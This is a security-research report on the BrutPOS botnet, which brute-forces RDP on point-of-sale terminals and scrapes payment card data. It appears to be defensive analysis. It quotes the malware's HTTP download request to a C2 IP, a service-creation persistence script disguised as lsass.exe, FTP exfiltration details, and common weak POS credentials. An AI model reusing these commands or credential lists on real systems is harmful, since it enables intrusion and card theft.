There have been an increasing number of headlines about breaches at retailers in which attackers have made off with credit card data after
compromising point-of-sale (POS) terminals. However, what is not commonly discussed is the fact that one third of these breaches are a result
of weak default passwords in the remote administration software that is typically installed on these systems. [1] While advanced exploits
generate a lot of interest, sometimes it’s defending the simple attacks that can keep your company from the headlines.
In this report, we document a botnet that we call BrutPOS which uses thousands of compromised computers to scan specified IP address
ranges for RDP servers that have weak or default passwords in an effort to locate vulnerable POS systems. [2]
BrutPOS
It is unclear exactly how the BrutPOS malware is being propagated. We have found that the malware is being distributed (along with a
considerable amount of otherwise unrelated malware) by the site destre45[.]com. The attackers may have used a distribution service provided
by other cybercriminals.
When executed, the malware copies itself to:
"%USERPROFILE%\%APPDATA%\llasc.exe"

It modifies the Windows Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Run_) so that it will be restarted after a reboot.
The malware connects to the command and control server (C2) to report its status and receives a list of usernames/passwords and IP
addresses to begin scanning.

The infected system begins to make connections to port 3389; if the port is open it adds the IP to a list of servers to be brute forced with the
supplied credentials. If the infected system is able to successfully brute force an RDP server, it reports back with credentials.
In total we found five C2 servers used by the BrutPOS botnet. Three of these servers are located on the same network in Russia; one of them
is located in Iran. Only two of these servers remain active at this time.

Based on the compile times of the samples we analyzed that connect to this C2 infrastructure, this botnet was active as of February 2014.
However, one of the active C2 servers was setup on May 28 and we believe that the second was setup in early June. We were able to recover
information from these two C2 servers in mid-June that allowed us to gain a better understanding of this botnet.
The attackers are able to control the botnet from a web-based administration panel. This panel provides a statistical overview of the botnet.

2/9

The botnet had a total of 5622 compromised computers under its control, however, only a fraction of those systems are active at any given
time (179 were active when we last checked). This page also displays the “current version” of the malware and if an infected system checking
in reports an earlier version a new executable will be pushed down to it.

3/9

The attackers are able to view the details of the infected systems under their control including the IP address and geographic location as well
as status of the infected systems’ brute forcing activities (bad / good / errors / threads / version) and the timestamp of the last connection to the
C2. The attackers may also specify commands such as “reload” and “delete”.
Based on the IP addresses on this page, there are 5622 infected systems spread across 119 countries.

This page lists the ranges of IP addresses that the attackers can specify to be scanned for RDP access and brute forced.

4/9

In total, the attackers specified 57 IP address ranges the majority of which (32) are located in the U.S.

The attackers can specify the user names and passwords that the infected systems use to brute force available RDP servers. Some of the
usernames and password indicate that the attackers are looking for specific brands of POS systems (such as Micros). [3]

When an infected system reports back a successful RDP login, the attackers store the username/password and IP address of the RDP server
as well as the IP address of the infected system that successfully brute forced it.

6/9

Of the 60 “good” RDP servers listed by the attackers the majority (51) are located in the U.S. The most common username was “administrator”
(36) and the most common passwords were “pos” (12) and “Password1” (12).
Payment Card Theft
During our investigation, we discovered another executable that is potentially run on systems once credentials are obtained (e.g.
4aed6a5897e9030f09f13f3c51668e92). This variant is intended to extract payment card information stored within running processes. It has
two distinct code paths depending on its ability to get debug permissions by calling RtlAdjustPrivilage(0x14,1,0…). This may be an attempt to
identify a POS configuration. If it succeeds in getting debug permissions, it downloads the executable and executes it:
GET /brut.loc/www/bin/1.exe HTTP/1.1
Accept-Encoding: gzip
Connection: Keep-Alive
Accept-Language: ru-RU,en,*
User-Agent: Browser
Host: 82.146.34.22

If the malware fails to get debug permissions, it copies itself to %WINDIR%\lsass.exe and installs itself as a service. The following script is
used to create and start the service:
sc create winserv binpath= C:\WINDOWS\lsass.exe type= own start= auto
sc start winserv
del 1.bat

When running as a service, the program scans the memory of all processes with the exception of csrss.exe and conhost.exe for potential
payment card information. Candidates are verified using the Luhn checksum and saved to winsrv.sys. It uploads ‘winsrv.sys’ using FTP to the
server 62.109.16.195.
Before connecting to the FTP server, the implant connects to smtp[.]gmail[.]com on port 25 and obtains the victim’s external IP address from
the EHLO response. winsrv.sys is uploaded to the FTP serving using a filename consisting of a capital character followed by the IP address.
The capital character prefixed to the filename is initialized to ‘A’ and is incremented through ‘Z’ for each new file. If the IP address isn’t obtained
from smtp[.]gmail[.]com, a random four digit number is generated.
Attribution
While there is insufficient information to determine attribution, there is some information which indicates that the attackers are in Eastern
Europe, probably Russia or Ukraine. In addition to the Russian language interface, we recovered web server logs and parsed out the six IP
addresses that used the administration interface.
Two of the IP addresses were from PEOPLE-NET, an ISP in Ukraine. In both cases the “User-Agent” indicates that the requests were coming
from an Alcatel mobile phone running Android:

7/9

"Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 5020D Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/32.0.1700.72 Mobile Safari/537.36 OPR/19.0.1340.69721"

Another Ukraine IP address, from the UKRTELNET-ADSL ISP, was also used. However, the “User-Agent” in this case was FireFox:
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"

There were also connections from an IP range in Russia assigned to the network “Macroregional_South” in Volvograd.
In addition to these connections there were also connections from the U.K. and France, however, these connections were made using VPN
services provided by atomintersoft.com and vpnlux.net.
Honeypot
In order to understand the attacker’s intentions, we decided to setup a Windows 2008 R2 Server with POS software and allow the attackers to
compromise it. In addition to POS software, we also put documents with fake credit card information on the Desktop. By mimicking the traffic
generated by the infected systems under the attackers control, we were able send a username and password combination of “micros” and
“admin” to the C2. We then waited for the attackers to connect.
We saw the attackers connect to the RDP instance 27 minutes after the fake username and password combination were sent to the C2. The
attackers connected from three IP addresses. One of the IP addresses was in the same Ukrainian IP address range assigned to PEOPLE-NET
that we saw in the C2 logs. Another was the same VPN based in the UK, while the third was assigned to INETHN in Honduras.
After connecting, the attackers immediately opened the document containing fake credit card information, then exited the system shortly after.
The second access attempt occurred 4 minutes later, with little activity. The third access occurred 18 minutes later. The attackers, on the third
access, then attempted to open the POS software; which was unsuccessful. The fourth access happened two minutes later, with very little
activity. The fifth and final access happened approximately 4 hours later, which led the attackers to format the drive, thus attempting to wipe
data trails.
Conclusion
POS systems remain a high priority target for cybercriminals. Based on a simple scanning attack, the attackers in this case were able leverage
their botnet of over 5000 machines in order to acquire access to 60 systems in two weeks.
While new malware and more advanced attacks are taking place, standard attacks against weak passwords for remote administration tools
presents a significant threat.
